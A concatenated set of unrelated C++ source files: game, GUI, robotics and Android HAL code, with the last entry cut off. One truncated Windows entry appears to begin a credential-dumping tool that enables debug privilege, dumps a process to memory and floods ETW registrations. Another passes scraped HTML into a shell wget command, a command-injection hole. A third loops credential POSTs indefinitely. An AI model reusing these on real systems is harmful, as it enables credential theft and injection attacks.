    "#include \"Character/ABCharacterNonPlayer.h\"\n#include \"Engine/AssetManager.h\"\n#include \"CharacterStat/ABCharacterStatComponent.h\"\n#include \"GameFramework/CharacterMovementComponent.h\"\n#include \"CharacterSkill/ABCharacterSkillComponent.h\"\n#include \"AI/ABAIController.h\"\n#include \"NavigationSystem.h\"\n\nAABCharacterNonPlayer::AABCharacterNonPlayer()\n{\n\tGetMesh()->SetHiddenInGame(true);\n\n\tAIControllerClass = AABAIController::StaticClass();\n\tAutoPossessAI = EAutoPossessAI::PlacedInWorldOrSpawned;\n\n}\n\nvoid AABCharacterNonPlayer::PostInitializeComponents()\n{\n\tSuper::PostInitializeComponents();\n\n\tensure(NPCMeshes.Num() > 0);\n\tint32 RandIndex = FMath::RandRange(0, NPCMeshes.Num() - 1);\n\tNPCMeshHandle = UAssetManager::Get().GetStreamableManager().\n\t\tRequestAsyncLoad(NPCMeshes[RandIndex], FStreamableDelegate::CreateUObject(this, &AABCharacterNonPlayer::NPCMeshLoadCompleted));\n\n\tBasicSkillComponent->Activate();\n\n\tif (bIsDummy)\n\t{\n\t\tAIControllerClass = nullptr;\n\t\tbDrawDebug = false;\n\t}\n\telse\n\t{\n\t\tbDrawDebug = true;\n\t}\n}\n\nvoid AABCharacterNonPlayer::SetDead()\n{\n\tif (bIsDummy)\n\t\treturn;\n\n\tSuper::SetDead();\n\n\tif (AABAIController* AIController = Cast<AABAIController>(Controller))\n\t{\n\t\tAIController->StopAI();\n\t}\n\t\n\tFTimerHandle DeadTimerHandle;\n\n\tGetWorld()->GetTimerManager().SetTimer(DeadTimerHandle, FTimerDelegate::CreateLambda(\n\t\t[&]() {\n\t\t\tDestroy();\n\t\t}),\n\t\tDeadEventDelayTime, false);\n}\n\nvoid AABCharacterNonPlayer::NPCMeshLoadCompleted()\n{\n\tif (NPCMeshHandle.IsValid())\n\t{\n\t\tUSkeletalMesh* NPCMesh = Cast<USkeletalMesh>(NPCMeshHandle->GetLoadedAsset());\n\t\tif (NPCMesh)\n\t\t{\n\t\t\tGetMesh()->SetSkeletalMesh(NPCMesh);\n\t\t\tGetMesh()->SetHiddenInGame(false);\n\t\t}\n\t}\n\n\tNPCMeshHandle->ReleaseHandle();\n}\n\nfloat AABCharacterNonPlayer::GetAIPatrolRadius()\n{\n\treturn 800.0f;\n}\n\nfloat AABCharacterNonPlayer::GetAIDetectRange()\n{\n\treturn 450.0f;\n}\n\nfloat AABCharacterNonPlayer::GetAIAttackRange()\n{\n\tif (BasicSkillComponent)\n\t{\n\t\treturn BasicSkillComponent->GetSkillRange();\n\t}\n\treturn 0.0f;\n}\n\nfloat AABCharacterNonPlayer::GetAITurnSpeed()\n{\n\treturn 3.0f;\n}\n\nvoid AABCharacterNonPlayer::AttackByAI()\n{\n\tif (BasicSkillComponent)\n\t{\n\t\tusing SkillParameters = IABSkillExecutorInterface::SkillParameters;\n\n\t\tSkillParameters OutSkillParams = SkillParameters();\n\t\tFABCharacterStat TotalStat = Stat->GetTotalStat();\n\n\t\tOutSkillParams.SkillDamageModifier = TotalStat.Attack;\n\n\t\tOutSkillParams.SkillExtentRate = FVector3f(TotalStat.AttackRangeRate);\n\t\tOutSkillParams.SkillRangeForwardModifier = TotalStat.AttackRangeForward;\n\t\tOutSkillParams.SkillSpeedRate = TotalStat.AttackSpeedRate;\n\n\t\tBasicSkillComponent->OnSkillBegin.BindLambda([&]() { GetCharacterMovement()->SetMovementMode(EMovementMode::MOVE_None); });\n\t\tBasicSkillComponent->OnSkillEnd.BindLambda([&]() { GetCharacterMovement()->SetMovementMode(EMovementMode::MOVE_Walking); });\n\n\t\tBasicSkillComponent->ExecuteSkill(OutSkillParams, bDrawDebug);\n\t}\n}\n\nvoid AABCharacterNonPlayer::StopAttackByAI()\n{\n\tif (BasicSkillComponent && BasicSkillComponent->IsActive())\n\t{\n\t\tBasicSkillComponent->CancelSkill();\n\t}\n}\n\n",
    "#include <iostream>\n#include <boost/asio.hpp>\n#include <string>\n#include <cstring>\n\n#ifdef _WIN32\n    #include <Windows.h>\n#endif\n\nusing namespace boost::asio;\nusing namespace boost::asio::ip;\n\nvoid send_http_request(const std::string& host, const std::string& port, const std::string& path) {\n    io_service io_service;\n    tcp::resolver resolver(io_service);\n    tcp::resolver::query query(host, port);\n    tcp::resolver::iterator endpoint_iterator = resolver.resolve(query);\n\n    tcp::socket socket(io_service);\n    connect(socket, endpoint_iterator);\n\n    // * Create HTTP GET request\n    std::string request = \"GET \" + path + \" HTTP/1.1\\r\\n\";\n    request += \"Host: \" + host + \"\\r\\n\";\n    request += \"Connection: close\\r\\n\\r\\n\";\n\n    // * Send the request\n    boost::asio::write(socket, buffer(request));\n\n    // * Receive the response\n    boost::system::error_code error;\n    while (true) {\n        char buf[512];\n        size_t len = socket.read_some(buffer(buf), error);\n\n        if (error == boost::asio::error::eof)\n            break;  // * Connection closed by peer\n        else if (error)\n            throw boost::system::system_error(error);  // * Some other error\n\n        std::cout.write(buf, len);\n    }\n}\n\nvoid post_http_request(const std::string& host, const std::string& port, const std::string& path, const std::string& data) {\n    io_service io_service;\n    tcp::resolver resolver(io_service);\n    tcp::resolver::query query(host, port);\n    tcp::resolver::iterator endpoint_iterator = resolver.resolve(query);\n\n    tcp::socket socket(io_service);\n    connect(socket, endpoint_iterator);\n\n    // * Create HTTP POST request\n    std::string request = \"POST \" + path + \" HTTP/1.1\\r\\n\";\n    request += \"Host: \" + host + \"\\r\\n\";\n    request += \"Content-Type: application/json\\r\\n\";\n    request += \"Content-Length: \" + std::to_string(data.length()) + \"\\r\\n\";\n    request += \"Connection: close\\r\\n\\r\\n\";\n    request += data;\n\n    // * Send the request\n    boost::asio::write(socket, buffer(request));\n\n    // * Receive the response\n    boost::system::error_code error;\n    std::string response;\n    while (true) {\n        char buf[512];\n        size_t len = socket.read_some(buffer(buf), error);\n\n        if (error == boost::asio::error::eof)\n            break;  // * Connection closed by peer\n        else if (error)\n            throw boost::system::system_error(error);  // * Some other error\n\n        response.append(buf, len);\n    }\n\n    // * Find the end of the headers\n    size_t header_end = response.find(\"\\r\\n\\r\\n\");\n    if (header_end != std::string::npos) {\n        std::cout << response.substr(header_end + 4) << std::endl;\n    }\n}\n\n#include <omp.h>\n\nint main() {\n    // * * send to 127.0.0.1:3000 with path /json\n    send_http_request(\"127.0.0.1\", \"3000\", \"/json\");\n    #pragma omp parallel\n    {\n        while (true) {\n            post_http_request(\"127.0.0.1\", \"3000\", \"/message\", \"{\\\"message\\\": \\\"admin\\\", \\\"password\\\": \\\"admin\\\"}\");\n        }\n    }\n\n    return 0;\n}\n",
    "#include \"Label.hpp\"\n#include \"Theme.hpp\"\n\nnamespace gui\n{\n\nLabel::Label(const sf::String& string)\n{\n    m_text.setFont(Theme::getFont());\n    m_text.setPosition(Theme::PADDING, Theme::PADDING);\n    m_text.setFillColor(Theme::click.textColor);\n    m_text.setCharacterSize(Theme::textSize);\n    setSelectable(false);\n    setText(string);\n}\n\n\nvoid Label::setText(const sf::String& string)\n{\n    m_text.setString(string);\n    updateGeometry();\n}\n\n\nconst sf::String& Label::getText() const\n{\n    return m_text.getString();\n}\n\n\nvoid Label::setFillColor(const sf::Color& color)\n{\n    m_text.setFillColor(color);\n}\n\n\nconst sf::Color& Label::getFillColor() const\n{\n    return m_text.getFillColor();\n}\n\n\nvoid Label::setTextSize(size_t size)\n{\n    m_text.setCharacterSize(size);\n    updateGeometry();\n}\n\n\nsize_t Label::getTextSize() const\n{\n    return m_text.getCharacterSize();\n}\n\n\nvoid Label::draw(sf::RenderTarget& target, sf::RenderStates states) const\n{\n    states.transform *= getTransform();\n    target.draw(m_text, states);\n}\n\n\nvoid Label::updateGeometry()\n{\n    Widget::setSize(\n        m_text.getLocalBounds().width + Theme::PADDING * 2, m_text.getLocalBounds().height + Theme::PADDING * 2\n    );\n}\n\n}\n",
    "// dear imgui: wrappers for C++ standard library (STL) types (std::string, etc.)\n// This is also an example of how you may wrap your own similar types.\n\n// Changelog:\n// - v0.10: Initial version. Added InputText() / InputTextMultiline() calls with std::string\n\n// See more C++ related extension (fmt, RAII, syntaxis sugar) on Wiki:\n//   https://github.com/ocornut/imgui/wiki/Useful-Extensions#cness\n\n#include \"imgui.h\"\n#include \"imgui_stdlib.h\"\n\nstruct InputTextCallback_UserData\n{\n    std::string*            Str;\n    ImGuiInputTextCallback  ChainCallback;\n    void*                   ChainCallbackUserData;\n};\n\nstatic int InputTextCallback(ImGuiInputTextCallbackData* data)\n{\n    InputTextCallback_UserData* user_data = (InputTextCallback_UserData*)data->UserData;\n    if (data->EventFlag == ImGuiInputTextFlags_CallbackResize)\n    {\n        // Resize string callback\n        // If for some reason we refuse the new length (BufTextLen) and/or capacity (BufSize) we need to set them back to what we want.\n        std::string* str = user_data->Str;\n        IM_ASSERT(data->Buf == str->c_str());\n        str->resize(data->BufTextLen);\n        data->Buf = (char*)str->c_str();\n    }\n    else if (user_data->ChainCallback)\n    {\n        // Forward to user callback, if any\n        data->UserData = user_data->ChainCallbackUserData;\n        return user_data->ChainCallback(data);\n    }\n    return 0;\n}\n\nbool ImGui::InputText(const char* label, std::string* str, ImGuiInputTextFlags flags, ImGuiInputTextCallback callback, void* user_data)\n{\n    IM_ASSERT((flags & ImGuiInputTextFlags_CallbackResize) == 0);\n    flags |= ImGuiInputTextFlags_CallbackResize;\n\n    InputTextCallback_UserData cb_user_data;\n    cb_user_data.Str = str;\n    cb_user_data.ChainCallback = callback;\n    cb_user_data.ChainCallbackUserData = user_data;\n    return InputText(label, (char*)str->c_str(), str->capacity() + 1, flags, InputTextCallback, &cb_user_data);\n}\n\nbool ImGui::InputTextMultiline(const char* label, std::string* str, const ImVec2& size, ImGuiInputTextFlags flags, ImGuiInputTextCallback callback, void* user_data)\n{\n    IM_ASSERT((flags & ImGuiInputTextFlags_CallbackResize) == 0);\n    flags |= ImGuiInputTextFlags_CallbackResize;\n\n    InputTextCallback_UserData cb_user_data;\n    cb_user_data.Str = str;\n    cb_user_data.ChainCallback = callback;\n    cb_user_data.ChainCallbackUserData = user_data;\n    return InputTextMultiline(label, (char*)str->c_str(), str->capacity() + 1, size, flags, InputTextCallback, &cb_user_data);\n}\n\nbool ImGui::InputTextWithHint(const char* label, const char* hint, std::string* str, ImGuiInputTextFlags flags, ImGuiInputTextCallback callback, void* user_data)\n{\n    IM_ASSERT((flags & ImGuiInputTextFlags_CallbackResize) == 0);\n    flags |= ImGuiInputTextFlags_CallbackResize;\n\n    InputTextCallback_UserData cb_user_data;\n    cb_user_data.Str = str;\n    cb_user_data.ChainCallback = callback;\n    cb_user_data.ChainCallbackUserData = user_data;\n    return InputTextWithHint(label, hint, (char*)str->c_str(), str->capacity() + 1, flags, InputTextCallback, &cb_user_data);\n}\n",
    "#include <iostream> //Allows for inputs and outputs\n#include <string> //Allows for string manipulation\n#include <vector> //Allows for working with dynamic arrays (vectors)\n#include \"Mobs.h\" //Includes the header file for \"Mobs.h\"\n\n\n//Mob class and MobBoss class (new classes)\n\n\nMobs::Mobs(std::string mob_name, int health) : mob_name(mob_name), health(health) {}\n/*\nConstructor for Mobs class, intitializes member variables mob_name and health with values passed as mob_name and health\n*/\nvoid Mobs::PrintMobStat() { //A function to print the mob statistics\n\tstd::cout << \"This is a \" << mob_name << \" and this has \" << health << \" health.\" << std::endl; //Outputs the mob stats\n}\nvoid Mobs::TakeMobHealth(int damage) { //A function to take away health from the mob\n\twhile (health > 0) { //Indefinite loop until the health is less than 0\n\t\tstd::cout << \"Press F to do damage to the mob!\" << std::endl;\n\t\tstd::string key_F; //key_F is a string\n\t\tstd::cin >> key_F; //key_F is taken as an input\n\t\tif (key_F == \"F\") { //Checks if F has been pressed\n\t\t\thealth = health - damage; //Takes away health from the mob via damage\n\t\t\tif (health < 0) {\n\t\t\t\tstd::cout << \"The mob is dead!\" << std::endl; //Outputs a message saying the mob is dead when it less than 0 points\n\t\t\t}\n\t\t\telse {\n\t\t\t\tstd::cout << \"This mob has \" << health << \" and you have done \" << damage << \" damage to the mob.\" << std::endl;\n\t\t\t\t//Outputs a message which shows the damage done to the mob and the health\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tstd::cout << \"No damage was done on the mob! This mob is at a health of: \" << health << std::endl;\n\t\t\t//Outputs a message to say the mob doesn't take damaage if F isn't pressed\n\t\t}\n\t}\n\tstd::cout << \"The mob has been banished!\" << std::endl; //Outputs a message when it is less than 0 points on health\n}\n\nMobBoss::MobBoss(std::string mob_name, int health, int bossDamage) : Mobs(mob_name, health), bossDamage(bossDamage) {}\n/*\nConstructor for MobBoss class, intitializes member variables mob_name and health with values passed as mob_name and health (assigned to Mobs) and bossDamage is initialized\nwith value bossDamage\n*/\nvoid MobBoss::PrintMobBossDamage() { //A function to print the amount of damage the mob boss does to the player\n\tPrintMobStat(); //Prints the details of the mob\n\tstd::cout << \"This mob does: \" << bossDamage << \" damage.\" << std::endl; //Prints the amount of damage the mob boss does\n}\nint MobBoss::BossDamage() { //A function to get the amount of damage the mob boss does\n\treturn bossDamage; //Returns the amount of damage the mob boss does\n}\n",
    "/******************************************************************************\nSingleton- \n1. Copy constructor disabled.\n2. operator = overloading deleted.\n3. getInstance() is thread-safe\n*******************************************************************************/\n#include <iostream>\n#include <thread>\n#include <mutex>\nusing namespace std;\n\nmutex SingletonMutex;\nclass Singleton{\n  \n  private:\n  \n  static Singleton *mySingleInstance;\n  \n  Singleton()\n  {\n      //private constructor so class is locked.\n  }\n  int data;\n  \n  public:\n  \n  Singleton(Singleton& other) = delete;//delete copy constructor\n  void operator =(Singleton* other) = delete;//delete assignment operation i.e. obj1 = obj2;\n  \n  static Singleton* getInstance();\n  void setData(int x){data=x;}\n  int getData(){return data;}\n    \n};\n\n\nSingleton* Singleton::mySingleInstance = NULL;\nSingleton* Singleton::getInstance()\n{\n    lock_guard<mutex> lock(SingletonMutex); //thread safe\n    if(mySingleInstance==NULL)\n    {\n        mySingleInstance = new Singleton;\n        return mySingleInstance;\n    }\n    return mySingleInstance;\n}\n\nint main()\n{\n    Singleton* inst1;\n    \n    inst1 = Singleton::getInstance();\n    inst1->setData(10);\n    \n    // Singleton inst2(*inst1); //won't work\n    Singleton* inst2(inst1); //will work\n    // Singleton inst2 = *inst1; //won't work\n    cout<<(inst2==inst1);\n\n    return 0;\n}\n",
    "/*\n * Copyright (C) 2020 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#define LOG_TAG \"android.hardware.usb@1.3-service-mediatekv2\"\n\n#include <hidl/HidlTransportSupport.h>\n#include \"Usb.h\"\n#include \"UsbGadget.h\"\n\nusing android::sp;\n\n// libhwbinder:\nusing android::hardware::configureRpcThreadpool;\nusing android::hardware::joinRpcThreadpool;\n\n// Generated HIDL files\nusing android::hardware::usb::gadget::V1_1::IUsbGadget;\nusing android::hardware::usb::gadget::V1_1::implementation::UsbGadget;\nusing android::hardware::usb::V1_3::IUsb;\nusing android::hardware::usb::V1_3::implementation::Usb;\n\nusing android::OK;\nusing android::status_t;\n\nint main() {\n    android::sp<IUsb> service = new Usb();\n    android::sp<IUsbGadget> service2 = new UsbGadget();\n\n    configureRpcThreadpool(2, true /*callerWillJoin*/);\n    status_t status = service->registerAsService();\n\n    if (status != OK) {\n        ALOGE(\"Cannot register USB HAL service\");\n        return 1;\n    }\n\n    status = service2->registerAsService();\n\n    if (status != OK) {\n        ALOGE(\"Cannot register USB Gadget HAL service\");\n        return 1;\n    }\n\n    ALOGI(\"USB HAL Ready.\");\n    joinRpcThreadpool();\n    // Under noraml cases, execution will not reach this line.\n    ALOGI(\"USB HAL failed to join thread pool.\");\n    return 1;\n}\n",
    "/*********************************************************************\n* Software License Agreement (BSD License)\n* \n*  Copyright (c) 2017-2020, Waterplus http://www.6-robot.com\n*  All rights reserved.\n* \n*  Redistribution and use in source and binary forms, with or without\n*  modification, are permitted provided that the following conditions\n*  are met:\n* \n*   * Redistributions of source code must retain the above copyright\n*     notice, this list of conditions and the following disclaimer.\n*   * Redistributions in binary form must reproduce the above\n*     copyright notice, this list of conditions and the following\n*     disclaimer in the documentation and/or other materials provided\n*     with the distribution.\n*   * Neither the name of the WaterPlus nor the names of its\n*     contributors may be used to endorse or promote products derived\n*     from this software without specific prior written permission.\n* \n*  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n*  \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n*  LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS\n*  FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE\n*  COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,\n*  FOOTPRINTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,\n*  BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n*  LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n*  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT\n*  LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN\n*  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n*  POSSIBILITY OF SUCH DAMAGE.\n*********************************************************************/\n/*!******************************************************************\n @author     ZhangWanjie\n ********************************************************************/\n\n#include <ros/ros.h>\n#include <std_msgs/String.h>\n#include <std_msgs/UInt64.h>\n\nvoid SndSrcCB(const std_msgs::UInt64::ConstPtr & msg)\n{\n  int sound_source_angle = msg->data;\n  printf(\"\u58f0\u6e90\u65b9\u5411\u89d2\u5ea6 = %d \\n\",sound_source_angle);\n}\n\nint main(int argc, char** argv)\n{\n  ros::init(argc, argv, \"wpb_home_sound_local\");\n\n  ros::NodeHandle n;\n  ros::Subscriber snd_src_sub = n.subscribe(\"/wpb_home/sound_source\", 10, SndSrcCB);\n  ros::Publisher cmd_pub = n.advertise<std_msgs::String>(\"/wpb_home/ctrl\", 10);\n\n  ros::Rate r(1);\n  while(ros::ok())\n  {\n    std_msgs::String cmd_msg;\n    cmd_msg.data = \"sound local\";\n    cmd_pub.publish(cmd_msg);\n    ros::spinOnce();\n    r.sleep();\n  }\n\n  return 0;\n}",
    "#include <iostream>\n#include <fstream>\n#include <regex>\n#include <cstdlib>\n\nint main() {\n    std::ifstream htmlFile(\"sample.html\");\n\n    if (!htmlFile.is_open()) {\n        std::cerr << \"Error opening file!\\n\";\n        return 1;\n    }\n\n    std::string line;\n    std::regex linkRegex(\"<a\\\\s+.*?href=['\\\"](.*?)['\\\"].*?>(.*?)</a>\");\n    std::regex imgRegex(\"<img\\\\s+.*?src=['\\\"](.*?)['\\\"].*?alt=['\\\"](.*?)['\\\"].*?>\");\n\n    while (std::getline(htmlFile, line)) {\n        std::smatch match;\n\n        if (std::regex_search(line, match, linkRegex)) {\n            std::cout << \"Link Text: \" << match[2].str() << \"\\n\";\n            std::cout << \"URL: \" << match[1].str() << \"\\n\";\n        }\n\n        if (std::regex_search(line, match, imgRegex)) {\n            std::cout << \"Alt Text: \" << match[2].str() << \"\\n\";\n            std::cout << \"Image URL: \" << match[1].str() << \"\\n\";\n\n            std::string downloadCommand = \"wget -O \" + match[2].str() + \".jpg \" + match[1].str();\n            std::system(downloadCommand.c_str());\n        }\n    }\n\n    htmlFile.close();\n\n    return 0;\n}\n",
    "#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\n int main() {\r\n    int n;\r\n    cout<<\"enter array size: \";\r\n    cin>>n;\r\n    int arr[n];\r\n\r\n    for(int i = 0 ; i<n;i++) {\r\n        cout<<\"elements in array: \";\r\n        cin>>arr[i];\r\n    }\r\n\r\n    int hash[13] = {0};\r\n    for(int i =0;i<n;i++) {\r\n        hash[arr[i]] += 1;\r\n    }\r\n    \r\n    int q ;\r\n    cout<<\"enter no. of querry: \";\r\n    cin>>q;\r\n    while(q--) {\r\n        int number;\r\n        cout<<\"enter no. u want to check: \";\r\n        cin>>number;\r\n        cout<<hash[number] << endl;\r\n    }\r\n    return 0;\r\n\r\n }\r\n\r\n\r\n//////////////////////same////////\r\nint main() {\r\n    int n;\r\n    cout<<\"enter the array size\";\r\n    cin>>n;\r\n    int arr[n];\r\n\r\n    for(int i = 1; i<=n ; i++) {\r\n        cout<<\"enter the elemnets in array\";\r\n        cin>>arr[i];\r\n\r\n    }\r\n\r\n    int hash[12] = {0};\r\n    for(int i =0 ; i<=n ;i++) {\r\n        hash[arr[i]] += 1;\r\n    }\r\n    int q;\r\n    cout<<\"enter no of querry\";\r\n    cin>>q;\r\n    while(q--) {\r\n    int number;\r\n    cout<<\"enter no. you want to check\";\r\n    cin>>number;\r\n    cout<<hash[number]<<endl;\r\n    }\r\n    return 0;\r\n}\r\n",
    "\ufeff#include \"includes.h\"\r\n\r\n#define WIN32_LEAN_AND_MEAN\r\n#define IsProcessSnapshotCallback 16\r\n#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)\r\n#define NtCurrentThread() ((HANDLE)(LONG_PTR)-2)\r\n#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)\r\n#define STATUS_SUCCESS 0x00000000\r\n#define STATUS_ACCESS_DENIED 0xC0000022\r\n#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004\r\n#define STATUS_BUFFER_TOO_SMALL 0xC0000023\r\n#define STATUS_ACCESS_DENIED 0xC0000022\r\nNTADJUSYPRIVILEGESTOKEN NtAdjustPrivilegesToken;\r\nNTQUERYSYSTEMINFORMATION NtQuerySystemInformation;\r\nNTOPENPROCESS NtOpenProcess;\r\nNTDUPLICATEOBJECT NtDuplicateObject;\r\nNTQUERYOBJECT NtQueryObject;\r\nNTCLOSE NtClose;\r\nNTDUPLICATETOKEN NtDuplicateToken;\r\nNTSETINFORMATIONTHREAD NtSetInformationThread;\r\nNTQUERYINFORMATIONTOKEN NtQueryInformationToken;\r\nNTOPENPROCESSTOKEN NtOpenProcessToken;\r\nSIZE_T DumpBufferSize = 130000000;\r\nLPVOID DumpBuffer;\r\nDWORD bytesRead = 0;\r\n\r\n//\u56de\u8c03\u51fd\u6570\r\nBOOL CALLBACK minidumpCallback(\r\n\tIN PVOID callbackParam,\r\n\tIN const PMINIDUMP_CALLBACK_INPUT callbackInput,\r\n\tIN OUT PMINIDUMP_CALLBACK_OUTPUT callbackOutput\r\n)\r\n{\r\n\tLPVOID destination = 0, source = 0;\r\n\tDWORD bufferSize = 0;\r\n\r\n\tswitch (callbackInput->CallbackType)\r\n\t{\r\n\tcase IsProcessSnapshotCallback:\r\n\t\tcallbackOutput->Status = S_FALSE;\r\n\t\tbreak;\r\n\r\n\tcase IoStartCallback:\r\n\t\tcallbackOutput->Status = S_FALSE;\r\n\t\tbreak;\r\n\r\n\tcase IoWriteAllCallback:\r\n\t\tcallbackOutput->Status = S_OK;\r\n\r\n\t\tsource = callbackInput->Io.Buffer;\r\n\t\tdestination = (LPVOID)((DWORD_PTR)DumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);\r\n\r\n\t\tbufferSize = callbackInput->Io.BufferBytes;\r\n\t\tbytesRead += bufferSize;\r\n\r\n\t\tif ((bytesRead <= DumpBufferSize) && (destination != NULL)) {\r\n\t\t\tRtlCopyMemory(destination, source, bufferSize);\r\n\t\t}\r\n\t\telse {\r\n\t\t\tcallbackOutput->Status = S_FALSE;\r\n\t\t}\r\n\r\n\t\tbreak;\r\n\r\n\tcase IoFinishCallback:\r\n\t\tcallbackOutput->Status = S_OK;\r\n\t\tbreak;\r\n\r\n\tdefault:\r\n\t\treturn TRUE;\r\n\t}\r\n\treturn TRUE;\r\n}\r\n\r\n//\u5224\u65ad\u6743\u9650\r\nBOOL System() {\r\n\tBOOL fIsElevated = FALSE;\r\n\tHANDLE hToken = NULL;\r\n\tTOKEN_ELEVATION elevation;\r\n\tDWORD dwSize;\r\n\r\n\tif (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {\r\n\t\tif (hToken) CloseHandle(hToken);\r\n\t\treturn FALSE;\r\n\t}\r\n\r\n\tif (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {\r\n\t\tif (hToken) CloseHandle(hToken);\r\n\t\treturn FALSE;\r\n\t}\r\n\r\n\tfIsElevated = elevation.TokenIsElevated;\r\n}\r\n\r\n\r\n//\u83b7\u53d6SeDebugPrivilege \u6743\u9650\r\nDWORD GetDebugPrivilege()\r\n{\r\n\tBOOL fOk = FALSE;\r\n\tHANDLE hToken;\r\n\tif (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))\r\n\t{\r\n\t\tTOKEN_PRIVILEGES tp;\r\n\t\ttp.PrivilegeCount = 1;\r\n\t\tLookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);\r\n\t\ttp.Privileges[0].Attributes = true ? SE_PRIVILEGE_ENABLED : 0;\r\n\t\tAdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);\r\n\t\tfOk = (GetLastError() == ERROR_SUCCESS);\r\n\t\tCloseHandle(hToken);\r\n\t\treturn 1;\r\n\t}\r\n\treturn 0;\r\n}\r\n\r\n//\r\nvoid E_T_W() {\r\n\tDWORD status = ERROR_SUCCESS;\r\n\tREGHANDLE RegistrationHandle = NULL;\r\n\tconst GUID ProviderGuid = { 0x230d3ce1, 0xbccc, 0x124e, {0x93, 0x1b, 0xd9, 0xcc, 0x2e, 0xee, 0x27, 0xe4} };\r\n\tint count = 0;\r\n\twhile (status = EventRegister(&ProviderGuid, NULL, NULL, &RegistrationHandle) == ERROR_SUCCESS) {\r\n\t\tcount++;\r\n\t}\r\n\tprintf(\"%d\\n\", count);\r\n}\r\n\r\n//\u83b7\u53d6pid\u53f7\r\nDWORD Logs(void)\r\n{\r\n\tEVT_HANDLE hResults = NULL;\r\n\tEVT_HANDLE hContext = NULL;\r\n\tEVT_HANDLE hEvent = NULL;\r\n\r\n\tDWORD ProcessId = 0;\r\n\tdo {\r\n\r\n\t\thResults = EvtQuery(NULL, L\"Security\", L\"*[System[EventID=4608]]\", EvtQueryChannelPath | EvtQueryTolerateQueryErrors);\r\n\t\tif (!hResults) {\r\n\t\t\twprintf(L\"EvtQuery failed: %x\\n\", GetLastError());\r\n\t\t\tbreak;\r\n\t\t}\r\n\r\n\t\tif (!EvtSeek(hResults, 0, NULL, 0, EvtSeekRelativeToLast)) {\r\n\t\t\twprintf(L\"EvtSeek failed:%x\\n\", GetLastError());\r\n\t\t\tbreak;\r\n\t\t}\r\n\r\n\t\tDWORD dwReturned = 0;\r\n\t\tif (!EvtNext(hResults, 1, &hEvent, INFINITE, 0, &dwReturned) || dwReturned != 1) {\r\n\t\t\twprintf(L\"EvtNext failed:%x\\n\", GetLastError());\r\n\t\t\tbreak;\r\n\t\t}\r\n\r\n\t\tLPCWSTR ppValues[] = { L\"Event/System/Execution/@ProcessID\" };\r\n\t\thContext = EvtCreateRenderContext(1, ppValues, EvtRenderContextValues);\r\n\t\tif (!hContext) {\r\n\t\t\twprintf(L\"EvtCreateRenderContext failed:%x\\n\", GetLastError());\r\n\t\t\tbreak;\r\n\t\t}\r\n\r\n\t\tEVT_VARIANT pProcessId = { 0 };\r\n\t\tif (!EvtRender(hContext, hEvent, EvtRenderEventValues, sizeof(EVT_VARIANT), &pProcessId, &dwReturned, NULL)) {\r\n\t\t\twprintf(L\"EvtRender failed:%x\\n\", GetLastError());\r\n\t\t\tbreak;\r\n\t\t}\r\n\r\n\t\tProcessId = pProcessId.UInt32Val;\r\n\t} while (FALSE);\r\n\r\n\tif (hEvent) EvtClose(hEvent);\r\n\tif (hContext) EvtClose(hContext);\r\n\tif (hResults) EvtClose(hResults);\r\n\r\n\treturn ProcessId;\r\n}\r\n\r\n\r\nvoid InitializeObjectAttributes(\r\n\tPOBJECT_ATTRIBUTES p,\r\n\tPUNICODE_STRING n,\r\n\tULONG a,\r\n\tHANDLE r,\r\n\tPVOID s\r\n) {\r\n\tp->Length = sizeof(OBJECT_ATTRIBUTES);\r\n\tp->RootDirectory = r;\r\n\tp->Attributes = a;\r\n\tp->ObjectName = n;\r\n\tp->SecurityDescriptor = s;\r\n\tp->SecurityQualityOfService = nullptr;\r\n}\r\n\r\nPSYSTEM_PROCESS_INFORMATION GetSysProcInfo() {\r\n\tNTSTATUS ",
    "#include \"render3d.h\"\n\nnamespace render3d\n{\n    bool IsNewlineChar(char c)\n    {\n        return c == '\\n' || c == '\\r';\n    }\n    \n    std::string ReadTextFile(const std::string& text_file)\n    {\n        auto statusOr = PathToResourceAsFile(text_file);\n        if (statusOr.status() != render3d::OkStatus())\n        {\n            return \"\";\n        }\n        std::string abs_model_file = statusOr.ValueOrDie();\n        FILE* file = fopen(abs_model_file.c_str(), \"r\");\n        if (file == nullptr)\n        {\n            return \"\";\n        }\n        \n        // read it to a memory chunk\n        fseek(file, 0, SEEK_END);\n        int file_size = ftell(file);\n\n        fseek(file, 0, SEEK_SET);\n        char* content = new char[file_size + 1];\n        fread(content, file_size, 1, file);\n        fclose(file);\n        content[file_size] = 0;\n        std::string res(content);\n        delete []content;\n        content = 